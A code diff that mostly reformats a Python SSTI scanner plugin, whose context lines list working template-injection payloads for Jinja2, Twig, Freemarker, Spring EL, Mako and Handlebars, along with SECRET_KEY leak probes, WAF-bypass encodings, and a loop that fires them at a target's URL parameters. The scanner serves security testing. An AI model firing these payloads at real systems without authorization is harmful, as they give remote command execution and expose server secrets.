@@ -1,4 +1,4 @@
-# plugins/ssti_scanner.py — Cascavel 2026 Intelligence
+import time
 import urllib.parse
 
 import requests
@@ -46,7 +46,10 @@ DETECTION_PAYLOADS = [
 # ──────────── TIME-BASED PAYLOADS (Para WAFs cegos) ────────────
 TIME_PAYLOADS = [
     # Jinja2 / Nunjucks
-    ("{% for i in range(10000) %}{% for j in range(1000) %}{% endfor %}{% endfor %}", "JINJA2_TIME_BASED"),
+    (
+        "{% for i in range(10000) %}{% for j in range(1000) %}{% endfor %}{% endfor %}",
+        "JINJA2_TIME_BASED",
+    ),
     # Freemarker
     ("<#list 1..10000000 as i></#list>", "FREEMARKER_TIME_BASED"),
 ]
@@ -55,15 +58,35 @@ TIME_PAYLOADS = [
 EXPLOIT_PAYLOADS = [
     # Jinja2 sandbox escape 2026 (lipsum, cycler, joiner)
     ("{{lipsum.__globals__['os'].popen('id').read()}}", "uid=", "JINJA2_LIPSUM_RCE"),
-    ("{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid=", "JINJA2_CYCLER_RCE"),
-    ("{{joiner.__init__.__globals__.os.popen('id').read()}}", "uid=", "JINJA2_JOINER_RCE"),
-    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid=", "JINJA2_CONFIG_RCE"),
-    ("{{request.__class__.__mro__[2].__subclasses__()}}", "subprocess", "JINJA2_SUBCLASS_ENUM"),
+    (
+        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+        "uid=",
+        "JINJA2_CYCLER_RCE",
+    ),
+    (
+        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
+        "uid=",
+        "JINJA2_JOINER_RCE",
+    ),
+    (
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "uid=",
+        "JINJA2_CONFIG_RCE",
+    ),
+    (
+        "{{request.__class__.__mro__[2].__subclasses__()}}",
+        "subprocess",
+        "JINJA2_SUBCLASS_ENUM",
+    ),
     # Twig RCE 2026
     ("{{['id']|filter('system')}}", "uid=", "TWIG_FILTER_RCE"),
     ("{{_self.env.setCache('ls')|system}}", "", "TWIG_SETCACHE_RCE"),
     # Freemarker RCE
-    ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', "uid=", "FREEMARKER_EXEC"),
+    (
+        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
+        "uid=",
+        "FREEMARKER_EXEC",
+    ),
     ('${T(java.lang.Runtime).getRuntime().exec("id")}', "", "SPRING_EL_RCE"),
     # Pebble
     (
@@ -78,7 +101,11 @@ EXPLOIT_PAYLOADS = [
     # Mako
     ("<%import os;x=os.popen('id').read()%>${x}", "uid=", "MAKO_RCE"),
     # Handlebars
-    ("{{#with (string.sub.apply 0 codez)}}\n{{this}}\n{{/with}}", "", "HANDLEBARS_PROTO"),
+    (
+        "{{#with (string.sub.apply 0 codez)}}\n{{this}}\n{{/with}}",
+        "",
+        "HANDLEBARS_PROTO",
+    ),
 ]
 
 # ──────────── CONFIG LEAK PAYLOADS ────────────
@@ -87,7 +114,11 @@ CONFIG_PAYLOADS = [
     ("{{config.items()}}", "SECRET_KEY", "JINJA2_CONFIG_ITEMS"),
     ("{{settings.SECRET_KEY}}", "", "DJANGO_SECRET"),
     ("{{self.__init__.__globals__}}", "os", "JINJA2_GLOBALS_LEAK"),
-    ("{{request.application.__self__._get_data_for_json.__globals__}}", "json", "FLASK_GLOBALS"),
+    (
+        "{{request.application.__self__._get_data_for_json.__globals__}}",
+        "json",
+        "FLASK_GLOBALS",
+    ),
 ]
 
 # ──────────── WAF BYPASS SSTI ────────────
@@ -99,11 +130,12 @@ WAF_BYPASS = [
     # String concatenation
     ("{{lipsum|attr('__glo'+'bals__')}}", "os", "CONCAT_BYPASS"),
     # Filter bypass via request object
-    ("{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}", "os", "REQUEST_ATTR"),
+    (
+        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
+        "os",
+        "REQUEST_ATTR",
+    ),
 ]
-
-
-import time
 
 
 def _get_baseline_latency(target):
@@ -143,7 +175,9 @@ def _is_evaluated(resp_text, payload, indicator):
     """Verifica avaliação real (não reflexão literal do payload)."""
     if indicator not in resp_text:
         return False
-    return resp_text.count(payload) == 0 or resp_text.count(indicator) > resp_text.count(payload)
+    return resp_text.count(payload) == 0 or resp_text.count(
+        indicator
+    ) > resp_text.count(payload)
 
 
 def _build_vuln(engine, param, payload, severity="CRITICO"):
@@ -184,7 +218,10 @@ def run(target, ip, open_ports, banners):
 
     # Verifica WAF reflection no param
     def check_fp(param_name, resp_text):
-        if baseline_len > 0 and abs(len(resp_text) - baseline_len) / baseline_len < 0.05:
+        if (
+            baseline_len > 0
+            and abs(len(resp_text) - baseline_len) / baseline_len < 0.05
+        ):
             return True
         return False
 
@@ -196,7 +233,9 @@ def run(target, ip, open_ports, banners):
                 resp = requests.get(url, timeout=6)
                 if check_fp(param, resp.text):
                     continue
-                if resp.status_code == 200 and _is_evaluated(resp.text, payload, indicator):
+                if resp.status_code == 200 and _is_evaluated(
+                    resp.text, payload, indicator
+                ):
                     if not _verify_waf_blind_reflection(target, param, payload):
                         vulns.append(_build_vuln(engine, param, payload, "ALTO"))
                         detected_params.add(param)
@@ -226,7 +265,9 @@ def run(target, ip, open_ports, banners):
                 resp = requests.get(url, timeout=6)
                 if check_fp(param, resp.text):
                     continue
-                if resp.status_code == 200 and (indicator in resp.text if indicator else len(resp.text) > 500):
+                if resp.status_code == 200 and (
+                    indicator in resp.text if indicator else len(resp.text) > 500
+                ):
                     if not _verify_waf_blind_reflection(target, param, payload):
                         vulns.append(_build_vuln(engine, param, payload, "ALTO"))
                         break
@@ -240,7 +281,9 @@ def run(target, ip, open_ports, banners):
                 try:
                     resp = requests.get(url, timeout=6)
                     if indicator and indicator in resp.text:
-                        vulns.append(_build_vuln(f"WAF_BYPASS_{engine}", param, payload))
+                        vulns.append(
+                            _build_vuln(f"WAF_BYPASS_{engine}", param, payload)
+                        )
                         break
                 except Exception:
                     continue
@@ -258,7 +301,9 @@ def run(target, ip, open_ports, banners):
                         vulns.append(_build_vuln(engine, param, payload, "ALTO"))
                         break
                 except requests.exceptions.Timeout:
-                    vulns.append(_build_vuln(f"{engine}_TIMEOUT", param, payload, "ALTO"))
+                    vulns.append(
+                        _build_vuln(f"{engine}_TIMEOUT", param, payload, "ALTO")
+                    )
                     break
                 except Exception:
                     continue
